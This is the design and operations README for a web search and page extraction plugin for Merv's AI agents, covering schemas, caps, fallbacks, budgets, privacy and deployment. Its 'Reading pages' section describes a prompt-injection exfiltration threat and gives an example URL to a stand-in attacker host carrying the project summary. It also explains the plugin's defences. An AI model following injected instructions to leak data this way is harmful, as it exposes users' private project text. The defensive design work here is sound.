# Web

Web gives every agent internet search, as Nisa's agents search: Tavily first,
and OpenAI's hosted web search when Tavily cannot serve. It is a port of Nisa's
`web_search` and `web_extract` (`project/backend/agents/tools/web_search.py`):
the same inputs, the same fix-ups reported in `normalization_note`, the same
caps and the same fallback triggers. It is optional and dormant: the deployment
composes it only where a key is configured (see [Turning it on](#turning-it-on)).

| Entrypoint        | Requires   | Provides                                                 |
| ----------------- | ---------- | -------------------------------------------------------- |
| `@merv/web`       | nothing    | `web` service                                            |
| `@merv/web/tools` | Web, Tools | `web.search`, and `web.extract` where Tavily has its key |

## Tools

Both tools are reads (`readOnly`) of another service (`openWorld`): the
registry runs them without holding a PostgreSQL snapshot while the provider
answers, and checks the caller again before handing back the result. They name
no `conversation` use, so:

- **Pi** offers them to every turn, a reader's too, as `web_search` and
  `web_extract`, and runs them as the person, with no Run button. A
  conversation's `web.extract` reads only a page one of that conversation's
  own searches returned (see [Reading pages](#reading-pages));
- **leased workers** may call them as open reads their policy never names, but
  the runner offers them only to a worker whose shell already has the network:
  Claude workers through `mcp__merv`, except a sealed review, which is launched
  with them disallowed; Codex workers on a hosted, unsealed launch, whose
  fixed tool list then names them. A Codex worker on the owner's machine has no
  network and does not get them. Codex's own hosted search stays disabled;
- **MCP clients** list them with `readOnlyHint` and `openWorldHint` set.

Descriptions name no address, since the Pi relay refuses a schema that does, and
tell the model to cite what it uses as Markdown links, to treat web text as
untrusted source material, to use a literature search tool for papers, and that
what it sends leaves Merv (see [Privacy](#privacy)).

`web.search { query, max_results?, search_depth?, topic?, time_range? }`

- `query` is a string of at most 400 characters, or up to 4 phrasings joined
  with OR into one request while they fit Tavily's 400 characters. An empty
  query, or one that is only a `site:` filter, is answered with
  `status: "needs_query_terms"` and a `fallback_hint`, and no request; a `site:`
  filter naming an exact page becomes that page's path terms.
- `max_results` is clamped to 1-20 (default 5). An unknown `search_depth`
  becomes `basic`, an unknown `topic` becomes `general`, `time_range` accepts
  `d`/`w`/`m`/`y` and drops anything else. Each fix-up is reported.
- The answer is `{ query, provider, results: [{ title, url, content, score }],
result_count }`, with `normalization_note`, and `content_truncated` with
  `content_budget_chars` when the caps cut. Content is capped at 6,000
  characters per result and 24,000 in all, as Nisa caps it, and further so the
  whole answer is at most 28,000 bytes of JSON: Pi shows the model 32,000 bytes
  of one result, and a larger one would reach it cut or as a bare index. Text
  that escapes or takes several bytes a character (code, CJK) is cut sooner;
  `content_budget_chars` then says how much the answer could hold. A result
  without an http(s) address is dropped; nothing else a provider sends is
  passed on.
- From the fallback (`provider: "openai_web_search"`), `answer` holds the
  model's synthesis (at most 24,000 characters) and `results` its distinct
  sources, with empty content and scores of 1/(i+1). Nisa also copies the answer
  into the first result; Web does not, so the answer is counted once.

`web.extract { url, extract_depth?, start_text?, end_text? }`

- Tavily reads the page. Merv never fetches it: Main sits on a network with
  services no caller may address, so a direct fetch would be a request forgery
  risk. There is no fallback, and the tool is not registered without a Tavily
  key.
- `url` must be an absolute http(s) address without credentials, or the answer
  is `status: "needs_valid_url"` and no request is made.
- With both markers, only the text between them is returned, with 200
  characters either side; a marker that misses returns the page with a warning.
  The content is always capped at 20,000 characters, and at 28,000 bytes of
  JSON for the whole answer.
- A page Tavily could not read is `status: "error"` with its reason and a hint
  to search instead.

### Reading pages

An address is a request to whoever serves it, and anything an agent has read
(a project record, a feed item, a search excerpt carrying an injected
instruction) can be written into one: `web.extract` on
`https://attacker.example/?d=<the project summary>` would put that summary in
the attacker's access log. Nobody presses Run on a conversation's read, so
from a conversation `web.extract` reads only an address that one of the same
conversation's `web.search` answers returned (its fragment ignored), and
refuses anything else with `web_address_unsearched` before any request, charged
nothing. The model is told to search for a page first, or to ask the person to
open it. The memory is per process (the last 500 addresses of the last 1,000
conversations), so after a restart the agent searches again. A worker or an MCP
client reads any address: where it is offered one, its own shell or client
reaches the network anyway.

What remains: the fallback's hosted search is a model's own search, and a
query can name an address it may open. Those pages are fetched by OpenAI, not
Merv, but a query built from project text still leaves as described under
[Privacy](#privacy).

## Providers and failures

Tavily is called at `POST /search` and `POST /extract` with the key as a bearer.
The fallback calls OpenAI's `POST /v1/responses` with
`tools: [{ type: "web_search" }]`, `include: ["web_search_call.action.sources"]`,
`reasoning: { effort: "low" }`, `max_tool_calls` 1 (2 for an advanced search,
so one budgeted call is at most that many billed hosted searches), 2,048 output
tokens (4,096 for an advanced search) and `store: false`, from inside the
handler; the Pi relay would refuse a hosted tool. Every call has a deadline over
all its attempts (Tavily 30 s, the fallback 90 s), follows no redirect, reads at
most 8 MiB of JSON, and retries twice what may pass: no answer, 408, 425, 429
or 5xx.

Search falls back exactly when Nisa does: Tavily has no key, or answers 401,
403, 432 or 433 (a missing, invalid or forbidden key, or a used-up plan). A 429
is Tavily's short-term rate limit, which Nisa does not fall back on either: once
its retries are spent it is `web_rate_limited`. Any other failure is Tavily's
and is not retried through the fallback. Errors say at most an HTTP status,
never what a provider wrote:

| Code                                                                   | Status | Meaning                                                                           |
| ---------------------------------------------------------------------- | ------ | --------------------------------------------------------------------------------- |
| `web_budget_exhausted`                                                 | 429    | A day's calls are made: the project's, the deployment's, or its fallback searches |
| `web_busy`                                                             | 429    | Every slot stayed taken for the 15 s a call waits                                 |
| `web_rate_limited`                                                     | 429    | A provider's rate limit held through its retries                                  |
| `web_unavailable`                                                      | 503    | No provider has a key (for `web.extract`: Tavily has none)                        |
| `web_provider_refused`, `web_quota_exhausted`                          | 503    | Tavily refused its key or its plan, with no fallback                              |
| `web_request_refused`                                                  | 422    | Tavily refused the request itself (HTTP 400)                                      |
| `web_address_unsearched`                                               | 422    | A conversation asked for a page none of its searches returned                     |
| `web_timeout`                                                          | 504    | The deadline passed                                                               |
| `web_upstream_error`, `web_invalid_response`, `web_response_too_large` | 502    | Anything else a provider did                                                      |
| `web_stopped`                                                          | 503    | The plugin is unloading                                                           |

A refusal is never 401 or 403, which a transport would take for the caller's
own. A tool's failure reaches a Pi turn as a result, not a failed request, so
the Pi worker never retries it: only the model may call again.

A call waits at most 15 s for its turn, 30 s on Tavily and 90 s on the fallback,
150 s in all; Codex workers are launched to wait 180 s on a Merv tool (their
default is 60 s), so a worker never gives up on a call Merv is still paying for.

## Cost controls

Nisa has none. Web has these, all in memory, so a restart forgets them; the
Tavily plan, and the OpenAI key's own spending limit, are the ceilings that
survive one:

- `dailyCallsPerProject` (default 200): each call that reaches a provider counts
  once against its project's UTC day, fallback included, whether or not the
  provider answers. An answer that needs no provider (`needs_query_terms`,
  `needs_valid_url`, `web_address_unsearched`) costs nothing, and neither does a
  call a limit here refuses.
- `dailyCalls` (default 1,000): the same count for the whole deployment.
  Projects cost nothing to make, so the per-project day bounds nobody's total.
- `fallbackDailyCalls` (default 200): the deployment's fallback searches per
  UTC day, each a grounded model call on the fallback's key (Pi's, if that is
  the key named), outside Pi's per-person token ceiling.
- `maxInFlight` (default 8) calls in flight in this process, and at most
  `maxInFlightPerProject` (half of it) for one project, so one project's
  callers (a reader's MCP client, say) cannot take every slot. A call past
  either waits its turn, in order, for up to `queueMs` (15 s), then is refused
  with `web_busy`, charged nothing: a Pi answer that searches six things at once
  runs them a few at a time.

The daily budgets are shared by everyone in a project, and by every project in
the deployment: a reader can spend its project's day. Raise them through the
environment below. Size them for Fleet before enabling its workflow
(`MERV_FLEET_WORKFLOW_ENABLED`): every Fleet agent in a project shares the
project's day with its Pi turns, and up to `MERV_FLEET_PROJECT_LIMIT` (5)
agents run at once. Five agents making 20 calls a step spend the default 200 in
two steps, and every later step that day, and the project's Pi, gets
`web_budget_exhausted`. Set `MERV_WEB_DAILY_CALLS_PER_PROJECT` to about the
project limit times the calls a step makes times the steps a project runs a
day, and `MERV_WEB_DAILY_CALLS` to what the projects together may spend.

Each call a provider was asked for is logged to stderr as one JSON line,
`{"event":"web.call","tool","projectId","actorId","providers","ms","code"?}`,
so spend can be traced to a project and an actor. The query and the address are
never logged.

## Privacy

A search's query, and the address of a page to read, leave Merv for Tavily, and
a fallback search's query for OpenAI (with `store: false`). Turning web search
on means any agent, worker or MCP client in any project can send text there.
The descriptions tell a model never to put unpublished project text,
credentials or signed links in a query or an address, but nothing enforces it:
decide with that in mind whether to configure the plugin, and which providers.

## Configuration

Only names of environment variables, never keys:

```json
{
  "keyEnv": "MERV_TAVILY_API_KEY",
  "fallback": { "keyEnv": "MERV_PI_MODEL_API_KEY", "model": "gpt-6-luna" },
  "timeoutMs": 30000,
  "maxResponseBytes": 8388608,
  "maxInFlight": 8,
  "queueMs": 15000,
  "dailyCallsPerProject": 200,
  "dailyCalls": 1000,
  "fallbackDailyCalls": 200
}
```

`origin` (and `fallback.origin`) default to Tavily's and OpenAI's APIs and may
name only another https origin, or a loopback one for a test's fake provider.
The fallback's model defaults to `gpt-6-luna`, as Nisa's runs on its Luna
deployment; whether a given model accepts the hosted web search tool is the
provider's to say. The plugin refuses to start with `web_configuration` when
neither key is set.

## Turning it on

Production and staging each read their own `/etc/merv/typescript.env`, and
`deploy/render-config.mjs` composes `web` and `web-tools` when it finds
`MERV_TAVILY_API_KEY` set, or `MERV_WEB_FALLBACK_KEY_ENV`. Add, with real values
only in the private file (never in a command line, a log or this repository):

```sh
# Tavily's key: rendering refuses one that is not tvly-… and never copies it.
MERV_TAVILY_API_KEY=CHANGE_ME
# Optional fallback: the NAME of the variable holding an OpenAI key. Pi's key serves.
MERV_WEB_FALLBACK_KEY_ENV=MERV_PI_MODEL_API_KEY
# Optional: MERV_WEB_FALLBACK_MODEL (default gpt-6-luna),
# MERV_WEB_DAILY_CALLS_PER_PROJECT (default 200, 1-100000),
# MERV_WEB_DAILY_CALLS (default 1000, 1-1000000),
# MERV_WEB_FALLBACK_DAILY_CALLS (default 200, 1-1000000; with a fallback only),
# MERV_WEB_MAX_IN_FLIGHT (default 8, 1-64).
```

The environment file is read when Main's container is created, and the render
runs on every start, so a bad value crash-loops Main. The image must also carry
this package: an older image's render ignores these variables. So:

1. Release an image that contains `@merv/web` (`deploy/release.mjs`, as for any
   release). Until the key exists it composes exactly what it did before.
2. Back up the env file, add the variables above, and dry-run the render with
   the running image, from the compose project's directory:

   ```sh
   cd "$(sudo docker inspect -f '{{index .Config.Labels "com.docker.compose.project.working_dir"}}' merv-typescript-control-1)"
   sudo MERV_TS_IMAGE="$(sudo docker inspect -f '{{.Config.Image}}' merv-typescript-control-1)" docker compose -f compose.yml run --rm --no-deps -T --entrypoint node control /app/deploy/render-config.mjs /tmp/render.json
   ```

3. Recreate Main on the same image (`docker restart` does not reread the env
   file), or let the next release recreate it:

   ```sh
   sudo MERV_TS_IMAGE="$(sudo docker inspect -f '{{.Config.Image}}' merv-typescript-control-1)" docker compose -f compose.yml up -d --force-recreate control
   ```

   A restart interrupts live Pi turns (see `deploy/PI_OPERATIONS.md`, Restarts
   and limits); choose a quiet window.

4. Check that the ready line lists the plugins, and that the tools answer:
   `sudo docker logs merv-typescript-control-1 2>&1 | grep '"status":"ready"' | tail -n1`
   should name `web` and `web-tools` as active; `web.search` should then appear
   in a project's MCP tool list, and in a new Pi turn.

To turn it off, remove the variables and recreate Main the same way. Hosted
Codex workers see the tools only once the hosted runner image carries the
runner change that names them (`deploy/hosted-release.mjs`, run by
`release.mjs`).

Read [Privacy](#privacy) before turning it on. To watch what it spends, grep
Main's logs for `"event":"web.call"`.

## Not verified

No call was made to Tavily or OpenAI: every test runs against loopback fakes
built from `tavily-python` 0.7.23 and the Responses API's documented shapes
(`max_tool_calls` included). That Claude Code honours `--disallowedTools` for
the two `mcp__merv__web_*` names on a sealed review under
`--dangerously-skip-permissions` is from its documentation and naming, not a
live run. Before relying on it, run one search and one page read from Main with
the real keys, and one search with Tavily's key removed if the fallback is
configured.
